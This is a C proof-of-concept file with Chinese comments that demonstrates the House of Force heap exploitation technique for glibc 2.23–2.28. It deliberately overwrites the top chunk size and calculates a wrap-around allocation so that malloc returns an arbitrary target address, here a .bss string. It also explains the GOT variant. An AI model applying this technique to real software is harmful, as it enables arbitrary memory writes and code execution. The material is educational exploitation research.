/*
 * 中文导读：本文件对应 house_of_force 手法，标注的版本范围是 2.23～2.28。
 * 模拟的漏洞是可以覆盖 top chunk 的 size 字段；核心思路是把 top->size
 * 改成一个极大值，再申请一段刚好等于「目标地址到旧 top」的环绕距离，
 * 让新的 top 落在目标地址前面。成功判据是下一次 malloc 直接返回目标
 * 指针；2.29 引入的 top size <= system_mem 检查会让这种经典写法失效。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

/*
 * House of Force 本身只依赖 top 与目标之间的相对距离，所以即使开着 ASLR，
 * 只要已经拿到堆地址和目标地址的泄露，思路依然成立。早期案例常把返回块
 * 导向 GOT，但那要求关闭 RELRO；RELRO 开启时可以改选栈、.bss 或其他可写
 * 目标。把 top 推向栈的经典讨论见：
 * http://phrack.org/issues/66/10.html
 * 上游曾在 64 位 Ubuntu 14.04 与 Ubuntu 18.04 上测试过这份 PoC。
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

char bss_var[] = "This is a string that we want to overwrite.";

int main(void)
{

	intptr_t *p1 = malloc(256);

	int real_size = malloc_usable_size(p1);

	//----- 漏洞模拟开始：通过相邻堆溢出覆盖 top header -----
	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));

	*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;

	//------------------------

	/*
	 * 反算 evil_size 的思路：设 nb 为 request2size 之后、包含 chunk header
	 * 的内部尺寸，那么新 top 的地址等于旧 top 加上 nb，同时 nb 也等于目标
	 * chunk header 的地址减去旧 top；对齐前的申请大小满足
	 * request + 2*sizeof(long) = nb。下一次 malloc 会把新 top 再加上用户区
	 * 偏移 2*sizeof(long) 作为返回值，要让这个返回值恰好落在 dest 上，就能
	 * 反推出本次申请参数：request = dest - old_top - 4*sizeof(long)。
	 * 这里全部按 unsigned long 运算，当目标地址比旧 top 低时会自然发生
	 * 模 2^64 的环绕；把 top size 伪造成 -1（也就是极大值）正是为了让
	 * 分配器仍然接受这段环绕距离对应的超大申请。
	 */
	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;

	malloc(evil_size);

	void* ctr_chunk = malloc(100);

	strcpy(ctr_chunk, "YEAH!!!");

	assert(ctr_chunk == bss_var);

	/*
	 * 如果把目标换成 malloc@GOT，计算方式完全一样：第一次受控的大申请把
	 * av->top 推到 malloc_got_address-header 这个位置；下一次普通申请
	 * 走 remainder/top 路径，返回 header 之后的用户区，正好等于
	 * malloc_got_address。本文件改用 bss_var 作为目标，是为了避免把
	 * “利用 GOT 时必须先关闭 RELRO”这个特定代码执行终点的限制，误写成
	 * House of Force 这个思想本身的必要条件。
	 */
}
